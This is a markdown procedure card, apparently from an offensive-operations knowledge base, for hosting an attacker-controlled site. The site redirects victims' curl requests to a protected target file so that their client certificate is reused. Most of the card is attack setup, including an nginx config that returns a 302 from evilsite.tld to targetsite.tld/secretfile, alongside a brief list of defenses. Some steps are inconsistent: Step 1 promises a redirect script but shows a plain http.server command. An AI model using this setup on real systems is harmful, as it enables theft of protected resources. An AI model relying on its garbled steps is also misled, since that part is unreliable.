---
id: proc-uuid-003
name: Setup-Attacker-Controlled-Redirect-Site
tags:
  - redirect
  - attacker-site
  - setup
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands: []
verified: false
platforms:
  - Linux
  - Windows
  - macOS
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:58.729Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Setup-Attacker-Controlled-Redirect-Site

## Summary

This procedure configures an attacker-controlled web server to issue a redirect to the target's protected resource, tricking curl into reusing the client certificate.

## Description

The attacker site (evilsite.tld) serves a simple HTTP 302 redirect to https://targetsite.tld/secretfile. This exploits curl's default behavior of following redirects with the same auth context. Use a lightweight server like Python's http.server or Nginx.

## Requirements

1. Domain control for evilsite.tld
2. Web server software (e.g., Python or Nginx)
3. HTTPS support if needed, but HTTP redirect works

## Defense

Defensive measures and detection strategies:

- Validate redirect URLs against allowlists in clients
- Log and alert on redirects from untrusted domains
- Disable automatic redirect following in sensitive apps

## Objectives

1. Host redirect endpoint at /something
2. Target redirect to protected /secretfile
3. Ensure no auth on attacker site

## Instructions

### Step 1: Create Redirect Script

**Context**: For Python server, create a handler for redirect.

Create redirect.py:

```bash
python3 -m http.server 80 --bind 0.0.0.0
```

But for custom, use a simple Flask app or static response.

For static: Create index.html with meta redirect or server config.

### Step 2: Configure Nginx for Redirect

**Context**: Use Nginx for production-like setup.

Edit nginx.conf:

```nginx
server {
    listen 443 ssl;
    server_name evilsite.tld;
    location /something {
        return 302 https://targetsite.tld/secretfile;
    }
}
```

Restart:

```bash
sudo nginx -s reload
```

> Issues 302 with Location header. Expected output: Curl to /something follows to target.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- redirect
- attacker-site
- setup
